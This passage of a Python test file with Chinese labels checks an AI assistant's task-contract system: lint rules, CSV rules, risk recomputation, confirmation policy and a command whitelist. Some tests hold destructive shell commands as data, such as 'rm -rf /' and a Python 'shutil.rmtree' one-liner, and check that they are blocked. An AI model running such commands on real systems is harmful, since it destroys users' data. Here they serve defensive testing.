        ('echo "rebooting the service"', False),
    ]
    for cmd, expect in destructive_cases:
        got = bool(_DESTRUCTIVE_CMD.search(cmd))
        check(f"L2 正则·{'拦下' if expect else '放行'} {cmd!r}", got == expect,
              f"实际命中={got}")
    # 遗留误报（改动前就有，本次未修）：reboot 作为裸词参数出现仍会被拦。
    # 记录现状而不是掩盖——这行红了说明有人收紧了正则，属改进。
    check("L2 已知遗留·echo reboot 仍被误拦（非本次回归）",
          bool(_DESTRUCTIVE_CMD.search("echo reboot")) is True)
    check("L2 通过·合法 exit_code_zero",
          "L2" not in lint_one({"type": "exit_code_zero", "cmd": "pytest -q", "cwd": ".", "timeout_s": 60}))
    check("L2 通过·合法 csv_assert",
          "L2" not in lint_one({"type": "csv_assert", "path": "out/a.csv",
                                "rules": [{"name": "unique_key", "args": {"columns": ["k"]}}]}))

    # L3 semantic 必带 rubric + 证据声明 + 非空话
    check("L3 拦下·semantic 无 rubric",
          "L3" in lint_one({"type": "rubric", "rubric": []}, kind="semantic"))
    check("L3 拦下·未声明 evidence_required",
          "L3" in lint_one({"type": "rubric", "rubric": ["每个结论都引用了数据来源"]},
                           kind="semantic"))
    check("L3 拦下·整句空话「内容准确」",
          "L3" in lint_one({"type": "rubric", "rubric": ["内容准确"], "evidence_required": True},
                           kind="semantic"))
    check("L3 拦下·整句空话「质量高」",
          "L3" in lint_one({"type": "rubric", "rubric": ["质量高"], "evidence_required": True},
                           kind="semantic"))
    # 词间空格变体（6764f4e 加了 re.sub 去空白，这组是回归锁）
    for spaced in ("内容 准确", "内容  准确", "质量 高", "质 量 高"):
        check(f"L3 拦下·去空白后的空话 {spaced!r}",
              "L3" in lint_one({"type": "rubric", "rubric": [spaced],
                                "evidence_required": True}, kind="semantic"))
    check("L3 通过·带证据的 rubric",
          "L3" not in lint_one({"type": "rubric",
                                "rubric": ["每个结论都引用了数据来源"],
                                "evidence_required": True}, kind="semantic"))
    check("L3 通过·含数字的核对条件",
          "L3" not in lint_one({"type": "rubric",
                                "rubric": ["报告覆盖了契约里列出的全部 5 个竞品"],
                                "evidence_required": True}, kind="semantic"))

    # L4 至少 1 条 required deterministic（纯语义任务例外：要 human）
    only_semantic = (mk_criterion(cid="S1", kind="semantic", required=True,
                                  check={"type": "rubric", "rubric": ["每个结论都引用了数据来源"],
                                         "evidence_required": True}),)
    result = lint_acceptance(only_semantic)
    check("L4 拦下·只有 required semantic", "L4" in result.rules(), str(result.rules()))
    with_human = only_semantic + (mk_criterion(cid="H1", kind="human", required=True,
                                               check={"type": "ask_user", "question": "这样行吗",
                                                      "options": ["行", "不行"]}),)
    # §3.8 R2：纯语义例外不再只看 human，还要 artifact.kind 在名单里。
    check("L4 拦下·未给 artifact.kind 时 human 不放行（R2）",
          "L4" in lint_acceptance(with_human).rules())
    check("L4 例外·report_md + required human 放行（R2）",
          "L4" not in lint_acceptance(with_human, artifact_kind="report_md").rules())
    check("L4 例外·message + required human 放行（R2）",
          "L4" not in lint_acceptance(with_human, artifact_kind="message").rules())
    check("L4 拦下·file 类产物 + human 不放行（R2）",
          "L4" in lint_acceptance(with_human, artifact_kind="file").rules())
    check("L4 拦下·code_patch + human 不放行（R2）",
          "L4" in lint_acceptance(with_human, artifact_kind="code_patch").rules())
    with_det = only_semantic + (mk_criterion(cid="D1", required=True),)
    check("L4 通过·有 required deterministic", "L4" not in lint_acceptance(with_det).rules())

    # L5 不得引用 Worker 自述
    self_report = (mk_criterion(cid="C1", text="Worker 报告已完成", required=True),)
    check("L5 拦下·引用 Worker 自述", "L5" in lint_acceptance(self_report).rules())
    check("L5 通过·不引用自述", "L5" not in lint_acceptance((mk_criterion(),)).rules())

    # L6 required 不超过 8 条
    eight = tuple(mk_criterion(cid=f"C{i}", required=True) for i in range(8))
    check("L6 边界·8 条 required 通过", "L6" not in lint_acceptance(eight).rules())
    nine = eight + (mk_criterion(cid="C9", required=True),)
    check("L6 拦下·9 条 required", "L6" in lint_acceptance(nine).rules())
    many_optional = tuple(mk_criterion(cid=f"O{i}", required=False) for i in range(12)) + (mk_criterion(),)
    check("L6·非 required 不计入上限", "L6" not in lint_acceptance(many_optional).rules())

    # L7 semantic 不超过 deterministic 两倍
    det2 = tuple(mk_criterion(cid=f"D{i}", required=True) for i in range(2))
    sem4 = tuple(mk_criterion(cid=f"S{i}", kind="semantic", required=True,
                              check={"type": "rubric", "rubric": ["每个结论都引用了数据来源"],
                                     "evidence_required": True}) for i in range(4))
    check("L7 边界·4 semantic = 2×2 deterministic 通过",
          "L7" not in lint_acceptance(det2 + sem4).rules())
    sem5 = sem4 + (mk_criterion(cid="S5", kind="semantic", required=True,
                                check={"type": "rubric", "rubric": ["每个结论都引用了数据来源"],
                                       "evidence_required": True}),)
    check("L7 拦下·5 semantic > 2×2 deterministic", "L7" in lint_acceptance(det2 + sem5).rules())


# ---------- G. CsvRule ----------

def test_g_csv_rules():
    print("[G 内置 CsvRule 六条·§3.7]")
    # header_equals_source
    src = [["a", "b"], ["1", "2"]]
    same = [["a", "b"], ["3", "4"]]
    check("header_equals_source·表头一致通过",
          apply_rule("header_equals_source", same, source_rows=src).ok)
    check("header_equals_source·表头不一致拒绝",
          not apply_rule("header_equals_source", [["a", "c"], ["1", "2"]], source_rows=src).ok)
    check("header_equals_source·列数不一致拒绝",
          not apply_rule("header_equals_source", [["a"], ["1"]], source_rows=src).ok)
    check("header_equals_source·无原表拒绝",
          not apply_rule("header_equals_source", same, source_rows=None).ok)

    # row_count_gte_source
    check("row_count_gte_source·行数相等通过",
          apply_rule("row_count_gte_source", [["a"], ["1"], ["2"]],
                     source_rows=[["a"], ["1"], ["2"]]).ok)
    check("row_count_gte_source·行数更多通过",
          apply_rule("row_count_gte_source", [["a"], ["1"], ["2"], ["3"]],
                     source_rows=[["a"], ["1"]]).ok)
    check("row_count_gte_source·行数更少拒绝",
          not apply_rule("row_count_gte_source", [["a"], ["1"]],
                         source_rows=[["a"], ["1"], ["2"]]).ok)
    trailing = [["a"], ["1"], ["2"], [""], [""]]
    check("row_count_gte_source·末尾空行不算数据行",
          apply_rule("row_count_gte_source", trailing, source_rows=[["a"], ["1"]]).ok)

    # no_empty_cells
    full = [["a", "b"], ["1", "2"], ["3", "4"]]
    check("no_empty_cells·无空格通过", apply_rule("no_empty_cells", full).ok)
    hole = [["a", "b"], ["1", ""]]
    check("no_empty_cells·有空单元格拒绝", not apply_rule("no_empty_cells", hole).ok)
    check("no_empty_cells·指定列通过",
          apply_rule("no_empty_cells", hole, args={"columns": ["a"]}).ok)
    check("no_empty_cells·指定列拒绝",
          not apply_rule("no_empty_cells", hole, args={"columns": ["b"]}).ok)
    check("no_empty_cells·未知列拒绝",
          not apply_rule("no_empty_cells", full, args={"columns": ["zzz"]}).ok)

    # column_values_in_set
    vals = [["status"], ["ok"], ["ok"]]
    check("column_values_in_set·全部在集合内通过",
          apply_rule("column_values_in_set", vals,
                     args={"column": "status", "values": ["ok", "warn"]}).ok)
    bad_val = [["status"], ["ok"], ["boom"]]
    check("column_values_in_set·集合外的值拒绝",
          not apply_rule("column_values_in_set", bad_val,
                         args={"column": "status", "values": ["ok"]}).ok)
    check("column_values_in_set·未知列拒绝",
          not apply_rule("column_values_in_set", vals,
                         args={"column": "zzz", "values": ["ok"]}).ok)
    empty_cell = [["status"], ["ok"], [""]]
    check("column_values_in_set·空格跳过（归 no_empty_cells 管）",
          apply_rule("column_values_in_set", empty_cell,
                     args={"column": "status", "values": ["ok"]}).ok)

    # changed_rows_column_is_today（三种情形）
    today = "2026-10-21"
    source_tbl = [["k", "v", "更新时间"], ["a", "1", "2026-10-01"]]
    changed_today = [["k", "v", "更新时间"], ["a", "2", today]]
    changed_old = [["k", "v", "更新时间"], ["a", "2", "2026-10-01"]]
    unchanged = [["k", "v", "更新时间"], ["a", "1", "2026-10-01"]]
    args = {"column": "更新时间", "today": today}
    check("changed_rows_column_is_today·改动行是今天通过",
          apply_rule("changed_rows_column_is_today", changed_today,
                     source_rows=source_tbl, args=args).ok)
    check("changed_rows_column_is_today·改动行不是今天拒绝",
          not apply_rule("changed_rows_column_is_today", changed_old,
                         source_rows=source_tbl, args=args).ok)
    result = apply_rule("changed_rows_column_is_today", unchanged,
                        source_rows=source_tbl, args=args)
    check("changed_rows_column_is_today·没检测到改动行拒绝（不静默放过）",
          not result.ok and "没有检测到改动" in result.detail, result.detail)
    check("changed_rows_column_is_today·无原表时检查全部非空值",
          apply_rule("changed_rows_column_is_today", changed_today, args=args).ok)

    # unique_key
    uniq = [["k", "v"], ["a", "1"], ["b", "2"]]
    check("unique_key·键唯一通过", apply_rule("unique_key", uniq, args={"columns": ["k"]}).ok)
    dup = [["k", "v"], ["a", "1"], ["a", "2"]]
    check("unique_key·键重复拒绝",
          not apply_rule("unique_key", dup, args={"columns": ["k"]}).ok)
    combo = [["k1", "k2"], ["a", "x"], ["a", "y"]]
    check("unique_key·组合键通过",
          apply_rule("unique_key", combo, args={"columns": ["k1", "k2"]}).ok)
    combo_dup = [["k1", "k2"], ["a", "x"], ["a", "x"]]
    check("unique_key·组合键重复拒绝",
          not apply_rule("unique_key", combo_dup, args={"columns": ["k1", "k2"]}).ok)
    check("unique_key·单列字符串参数兼容",
          apply_rule("unique_key", uniq, args={"columns": "k"}).ok)
    check("unique_key·未知列拒绝",
          not apply_rule("unique_key", uniq, args={"columns": ["zzz"]}).ok)

    # 分发
    check("apply_rule·未知规则名失败", not apply_rule("made_up_rule", full).ok)
    check("规则库恰好 6 条", len(RULES) == 6, str(sorted(RULES)))
    check("read_rows·解析 CSV 文本",
          read_rows("a,b\n1,2\n") == [["a", "b"], ["1", "2"]])
    check("read_rows_from_bytes·剥 UTF-8 BOM",
          read_rows_from_bytes(b"\xef\xbb\xbfa,b\n1,2\n") == [["a", "b"], ["1", "2"]])
    check("read_rows·空文本返回空列表", read_rows("") == [])


# ---------- H. §3.6 完整示例 ----------

def test_h_spec_example():
    print("[H §3.6 完整示例·竞品表格]")
    problems = []
    goal = Slot.from_mapping(
        {"value": "更新竞品对比表的最新数据，并把更新后的表格发给用户",
         "source": {"kind": "user_utterance", "turn_id": "t_88"}, "confirmed": False},
        where="goal", problems=problems)
    inputs = (Slot.from_mapping(
        {"value": InputRef(type="file", uri="~/work/competitors/竞品对比.csv",
                           resolved_by="modified_yesterday", exists=True),
         "source": {"kind": "memory", "memory_id": "m_0142", "confidence": 0.91},
         "confirmed": False}, where="inputs[0]", problems=problems),)
    artifact = Slot.from_mapping(
        {"value": ArtifactSpec(kind="csv", format="csv", location="out/竞品对比.csv"),
         "source": {"kind": "memory", "memory_id": "m_0142", "confidence": 0.91},
         "confirmed": False}, where="artifact", problems=problems)
    deliver_to = Slot.from_mapping(
        {"value": "secret_ref:webhook/self_notify",
         "source": {"kind": "memory", "memory_id": "m_0177", "confidence": 0.88},
         "confirmed": False, "highlight": True}, where="deliver_to", problems=problems)
    effects = (SideEffect(id="se_1", type="send_message",
                          target="secret_ref:webhook/self_notify", target_class="self",
                          reversible=False, idempotency_key="ct_demo_001:se_1"),)
    acceptance = tuple(
        Criterion.parse(item, where=f"acceptance[{i}]", problems=problems)
        for i, item in enumerate([
            {"id": "C1", "text": "输出文件存在且不为空", "kind": "deterministic",
             "check": {"type": "file_exists_nonempty", "path": "out/竞品对比.csv",
                       "min_bytes": 100}, "required": True},
            {"id": "C2", "text": "表头与原表一致，行数不少于原表", "kind": "deterministic",
             "check": {"type": "csv_assert", "path": "out/竞品对比.csv",
                       "rules": [{"name": "header_equals_source"},
                                 {"name": "row_count_gte_source"}]}, "required": True},
            {"id": "C3", "text": "被更新的行，「更新时间」列为今天", "kind": "deterministic",
             "check": {"type": "csv_assert", "path": "out/竞品对比.csv",
                       "rules": [{"name": "changed_rows_column_is_today",
                                  "args": {"column": "更新时间"}}]}, "required": True},
            {"id": "C4", "text": "变更摘要逐条列出新增与修改的竞品，每条附来源链接",
             "kind": "semantic",
             "check": {"type": "rubric",
                       "rubric": ["摘要里的每个条目都能在输出表中找到对应行",
                                  "每个条目都附有来源链接"],
                       "evidence_required": True}, "required": True},
        ]))
    draft = Draft(contract_id="ct_demo_001", version=1, created_at="2026-10-21T00:00:00Z",
                  utterance="小汐，把昨天那个竞品表格更新一下发我",
                  goal=goal, inputs=inputs, artifact=artifact, deliver_to=deliver_to,
                  acceptance=acceptance, side_effects=effects,
                  permissions_required=("L1", "L4", "L5"),
                  budget=Budget(max_retries=3, max_step_retries=2, max_wall_s=900))
    outcome = evaluate(draft, round_index=0)
    check("示例·gate 判定 ready", outcome.status == "ready",
          f"{outcome.status} gaps={[g.check for g in outcome.gaps]}")
    contract = outcome.contract
    check("示例·契约已冻结", isinstance(contract, TaskContract))
    if contract is not None:
        # §6.2 vs §3.6 的规范内冲突（3b 接入后按 §6.2 收口）：示例权限表含 L5
        # （发消息按 §6.2 就是 L5 能力），副作用规则算出 medium，但 §6.2 硬断言
        # 「L5/L6 出现在契约里，risk 不得低于 high——风险规则算漏了，权限表兜住」
        # 写于 §3.6 之后且自我声明为硬断言，故示例实际冻结结果是 high，不是
        # §3.6 原文写的 medium。这条变化本身就是 3b 的回归锁。
        check("示例·risk=high（副作用算 medium，但 §6.2 权限下界 L5 兜到 high）",
              contract.risk.level == "high", contract.risk.level)
        check("示例·risk 理由非空", len(contract.risk.reasons) >= 1)
        check("示例·risk 理由点名 §6.2 下界",
              any("§6.2" in item for item in contract.risk.reasons), str(contract.risk.reasons))
        check("示例·deliver_to 高亮（副作用槽位，c=0.88 也要展示）",
              "deliver_to" in outcome.high_lighted_slots,
              str(outcome.high_lighted_slots))
        policy = effective_start_policy(outcome)
        check("示例·high 风险不走倒计时", policy["countdown_allowed"] is False)
        check("示例·high 风险必须显式确认并逐项点头高亮槽位",
              policy["start"] == EXPLICIT_CONFIRM_WITH_SLOT_ACK, policy["start"])
        policy_direct = confirmation_policy("high")
        check("示例·交付前需要确认（展示目的地与内容摘要）",
              policy_direct["delivery_confirmation"] == "required_show_destination_and_summary")
        check("示例·验收标准 4 条全部可解析", len(contract.acceptance) == 4)
        check("示例·C1 默认 promotion_weight=1.0（deterministic）",
              contract.acceptance[0].promotion_weight == 1.0)
        check("示例·C4 默认 promotion_weight=0.4（semantic）",
              contract.acceptance[3].promotion_weight == 0.4)
    lint_result = lint_acceptance(acceptance)
    check("示例·C1–C4 全部通过 lint", lint_result.ok, str(lint_result.problems))
    check("示例·deliver_to 置信度 0.88 走确认档（副作用槽位）",
          SilentFillPolicy().decide(0.88, is_side_effect_slot=True) == "confirm")


# ---------- I. 边界断言 ----------

def test_i_boundaries():
    print("[I 边界断言·冻结项一个都不出现]")
    contract_dir = ROOT / "server" / "contract"
    files = sorted(p for p in contract_dir.glob("*.py"))
    check("契约包文件齐全", len(files) >= 7, str([p.name for p in files]))

    forbidden_modules = ("server.assistant", "server.memory", "server.dialogue",
                         "server.interaction", "server.persona", "server.app")
    bad_imports = []
    for path in files:
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if any(alias.name == m or alias.name.startswith(m + ".")
                           for m in forbidden_modules):
                        bad_imports.append(f"{path.name}: import {alias.name}")
            elif isinstance(node, ast.ImportFrom):
                module = node.module or ""
                if node.level == 0 and any(
                        module == m or module.startswith(m + ".")
                        for m in forbidden_modules):
                    bad_imports.append(f"{path.name}: from {module} import ...")
    check("边界·不 import 任何现有业务模块", not bad_imports, str(bad_imports))

    # 冻结项：TaskEngine / Verifier / EventBus 一行不写
    frozen_classes = ("TaskEngine", "Verifier", "EventBus")
    found = []
    for path in files:
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef) and node.name in frozen_classes:
                found.append(f"{path.name}: class {node.name}")
            elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name in (
                    "verify", "publish", "subscribe", "submit", "handle"):
                found.append(f"{path.name}: def {node.name}")
    check("边界·没有 TaskEngine/Verifier/EventBus 实现", not found, str(found))

    # 等级合法性归 G6（gate.py）管，shape 层**故意不管**——这不是疏漏，是层级裁定。
    # 依据：L0–L6 等级表现在定义在 gate.py，model.py 若去 import 它会形成
    # model → gate → model 循环依赖。所以 shape 层只校验形状（非空 + 元素为非空字符串），
    # 等级合法性由 G6 把关。别在这里「补上」等级校验，那会绕过裁定并引入循环依赖。
    nonsense = {"contract_id": "ct_n", "version": 1, "created_at": "t", "utterance": "u",
                "goal": {"value": "做点事", "source": {"kind": "user_utterance", "turn_id": "t1"}},
                "artifact": {"value": {"kind": "csv", "format": "csv"},
                             "source": {"kind": "default", "reason": "r"}},
                "acceptance": [{"id": "C1", "text": "x", "kind": "deterministic",
                                "check": {"type": "file_exists_nonempty", "path": "out/x.csv"},
                                "required": True}],
                "risk": {"level": "low", "reasons": []},
                "side_effects": [], "permissions_required": ["NONSENSE_LEVEL"],
                "budget": {"max_retries": 3, "max_step_retries": 2, "max_wall_s": 900}}
    try:
        parsed = parse_contract(nonsense)
        check("shape 层不管等级合法性（归 G6，避开 model→gate 循环依赖）",
              parsed.permissions_required == ("NONSENSE_LEVEL",))
    except ContractShapeError as exc:
        check("shape 层不管等级合法性（归 G6，避开 model→gate 循环依赖）",
              False, str(exc.problems))

    # 冻结项：exit_code_zero 的 cmd 只校验形状，不执行
    tmpdir = tempfile.mkdtemp(prefix="qa-contract-")
    marker = os.path.join(tmpdir, "must_not_exist.txt")
    cmd = ('python -c "import pathlib; pathlib.Path(' + repr(marker)
           + ").write_text('x')\"")
    problems = []
    criterion = Criterion.parse(
        {"id": "C1", "text": "跑一条会写文件的命令（不应被执行）", "kind": "deterministic",
         "check": {"type": "exit_code_zero", "cmd": cmd, "cwd": ".", "timeout_s": 5}},
        where="acceptance.C1", problems=problems)
    check("exit_code_zero·cmd 形状合法", criterion is not None, str(problems))
    if criterion is not None:
        lint_result = lint_acceptance((criterion,))
        check("exit_code_zero·lint 通过（形状校验只）", lint_result.ok, str(lint_result.problems))
    check("exit_code_zero·命令没有被执行（文件未创建）",
          not os.path.exists(marker), marker)
    frozen = freeze(mk_draft(acceptance=(criterion,)))
    check("exit_code_zero·整条 gate+freeze 链路也不执行命令",
          not os.path.exists(marker), marker)
    if os.path.exists(marker):  # pragma: no cover - 只在真出事时跑
        os.unlink(marker)
    else:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ---------- J. parse_contract 形状 ----------

def test_j_parse_contract():
    print("[J parse_contract 形状校验]")
    base = {
        "contract_id": "ct_1", "version": 1, "created_at": "t", "utterance": "u",
        "goal": {"value": "做点事", "source": {"kind": "user_utterance", "turn_id": "t1"}},
        "artifact": {"value": {"kind": "csv", "format": "csv"},
                     "source": {"kind": "default", "reason": "r"}},
        "acceptance": [{"id": "C1", "text": "x", "kind": "deterministic",
                        "check": {"type": "file_exists_nonempty", "path": "out/x.csv"},
                        "required": True}],
        "risk": {"level": "low", "reasons": []},
        "side_effects": [], "permissions_required": ["L1"],
        "budget": {"max_retries": 3, "max_step_retries": 2, "max_wall_s": 900},
    }
    contract = parse_contract(base)
    check("形状·合法契约解析成功", contract.contract_id == "ct_1")

    def expect_error(mutate, needle):
        raw = dict(base)
        mutate(raw)
        try:
            parse_contract(raw)
            return False, "未抛异常"
        except ContractShapeError as exc:
            hit = any(needle in item for item in exc.problems)
            return hit, str(exc.problems)

    ok, detail = expect_error(lambda r: r.pop("contract_id"), "contract_id")
    check("形状·缺 contract_id 报错", ok, detail)
    ok, detail = expect_error(lambda r: r.update(version=0), "version")
    check("形状·version=0 报错", ok, detail)
    ok, detail = expect_error(lambda r: r.update(goal={"value": ""}), "goal")
    check("形状·goal 空值报错", ok, detail)
    ok, detail = expect_error(
        lambda r: r.update(goal={"value": "x", "source": {"kind": "memory", "memory_id": "m"}}),
        "confidence")
    check("形状·memory 源缺 confidence 报错", ok, detail)
    ok, detail = expect_error(
        lambda r: r.update(artifact={"value": {"kind": "nope"},
                                     "source": {"kind": "default", "reason": "r"}}),
        "kind")
    check("形状·artifact kind 越界报错", ok, detail)
    ok, detail = expect_error(
        lambda r: r.update(side_effects=[{"id": "s", "type": "send_message"}]),
        "idempotency_key")
    check("形状·副作用缺 idempotency_key 报错", ok, detail)
    ok, detail = expect_error(lambda r: r.pop("risk"), "risk")
    check("形状·缺 risk 字段报错", ok, detail)
    ok, detail = expect_error(lambda r: r.update(budget={"max_wall_s": 0}), "max_wall_s")
    check("形状·max_wall_s=0 报错", ok, detail)

    # 错误累积：一次报出全部问题，不是遇到第一个就停
    broken = dict(base)
    broken.pop("contract_id")
    broken.update(version=0, utterance="")
    try:
        parse_contract(broken)
        check("形状·多个错误一次全报", False, "未抛异常")
    except ContractShapeError as exc:
        check("形状·多个错误一次全报", len(exc.problems) >= 3, str(exc.problems))

    # §3.2：risk 由规则重算，不允许手填降级
    hand_filled = dict(base)
    hand_filled["risk"] = {"level": "low", "reasons": ["手填的"]}
    hand_filled["side_effects"] = [{"id": "se_1", "type": "delete", "target": "x",
                                    "target_class": "local", "reversible": False,
                                    "idempotency_key": "k"}]
    recomputed = parse_contract(hand_filled)
    check("§3.2·手填 low 被重算为 high（delete 不可逆）",
          recomputed.risk.level == "high", recomputed.risk.level)
    honest = dict(base)
    honest["risk"] = {"level": "high", "reasons": []}
    honest["side_effects"] = [{"id": "se_1", "type": "send_message", "target": "x",
                               "target_class": "self", "reversible": True,
                               "idempotency_key": "k"}]
    check("§3.2·手填 high 也被重算（send_message 给自己=medium）",
          parse_contract(honest).risk.level == "medium")

    # §6.2（3b）跨字段：手填 low + L6 权限 → 重算为 high。
    # L6+low 这种自相矛盾的组合（等级说「要花钱/安装/写工作区外」，
    # 风险说「低，可自动开工」）从此进不了任何一条冻结路径。
    l6_low = dict(base)
    l6_low["risk"] = {"level": "low", "reasons": ["手填的"]}
    l6_low["permissions_required"] = ["L6"]
    check("§6.2·手填 low 配 L6 被重算为 high（L6+low 组合被拒绝）",
          parse_contract(l6_low).risk.level == "high",
          parse_contract(l6_low).risk.level)
    l5_low = dict(base)
    l5_low["risk"] = {"level": "low", "reasons": ["手填的"]}
    l5_low["permissions_required"] = ["L0", "L5"]
    check("§6.2·L5 混在低等级里同样被重算为 high",
          parse_contract(l5_low).risk.level == "high",
          parse_contract(l5_low).risk.level)

    # to_mapping 回写（docstring 声称「回写成规范形状的 dict，便于测试断言与日志」）
    round_tripped = contract.to_mapping()
    try:
        parse_contract(round_tripped)
        check("to_mapping·回写后可再解析", True)
    except ContractShapeError as exc:
        check("to_mapping·回写后可再解析（docstring 承诺规范形状）", False, str(exc.problems))
    try:
        json.dumps(round_tripped, ensure_ascii=False)
        check("to_mapping·输出可 JSON 序列化（日志用途）", True)
    except TypeError as exc:
        check("to_mapping·输出可 JSON 序列化（日志用途）", False, str(exc))
    # 嵌套值必须是规范形状的对象，不是 dataclass 实例
    check("to_mapping·artifact.value 是 dict",
          isinstance(round_tripped["artifact"]["value"], dict),
          type(round_tripped["artifact"]["value"]).__name__)
    check("to_mapping·inputs[0].value 是 dict",
          all(isinstance(item["value"], dict) for item in round_tripped["inputs"]))


def test_k_r1_command_whitelist():
    """§3.8 R1：命令白名单。

    背景：原先 L2 只有黑名单（rm -rf / format / dd if= ...），而黑名单永远漏——
    python -c "import shutil; shutil.rmtree(...)" 不含任何危险词，却能删库。
    白名单决定「能不能跑」，黑名单再兜一层「跑也不能这样跑」，两道并存。
    """
    print("[K] §3.8 R1 命令白名单")

    def mk(cmd: str) -> Criterion:
        return Criterion(
            id="c1", text="跑测试", kind="deterministic", required=True,
            check=CheckSpec(type="exit_code_zero", cmd=cmd, cwd=".", timeout_s=60),
        )

    allow = ("pytest", "node", "node scripts/*.mjs")

    r = lint_acceptance([mk("任意命令 --x")])
    blocked = [p for p in r.problems if p.rule == "L2" and "白名单" in p.message]
    check("空白名单不拦（旧行为不变）", not blocked)

    for cmd in ("pytest -q", "node", "node scripts/smoke.mjs"):
        r = lint_acceptance([mk(cmd)], allowed_commands=allow)
        hit = [p for p in r.problems if p.rule == "L2" and "白名单" in p.message]
        check(f"白名单内放行：{cmd}", not hit)

    for cmd in (
        "python -c \"import shutil; shutil.rmtree(1)\"",
        "node evil.js",
        "bash -c whatever",
    ):
        r = lint_acceptance([mk(cmd)], allowed_commands=allow)
        hit = [p for p in r.problems if p.rule == "L2" and "白名单" in p.message]
        check(f"白名单外拦住：{cmd[:38]}", bool(hit))

    r = lint_acceptance([mk("rm -rf /")], allowed_commands=allow)
    destructive = [p for p in r.problems if p.rule == "L2" and "破坏性" in p.message]
    check("黑名单仍生效（两道并存）", bool(destructive))

    import yaml
    cfg = yaml.safe_load((ROOT / "config" / "contract.yaml").read_text(encoding="utf-8"))
    allowed = (cfg.get("lint") or {}).get("allowed_commands") or []
    check("contract.yaml 里有 allowed_commands", isinstance(allowed, list) and len(allowed) > 0)
    check("pytest 在默认白名单里", "pytest" in allowed)


def main() -> int:
    test_a_gates()
    test_b_clarification()
    test_c_risk()
    test_d_confirmation()
    test_e_confidence()
    test_f_lint()
    test_g_csv_rules()
    test_h_spec_example()
    test_i_boundaries()
    test_j_parse_contract()
    test_k_r1_command_whitelist()

    print()
    print("=" * 72)
    if failed:
        print(f"FAILED {len(failed)}/{passed + len(failed)}")
        for item in failed:
            print("  - " + item)
        return 1
    print(f"PASS {passed}/{passed}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
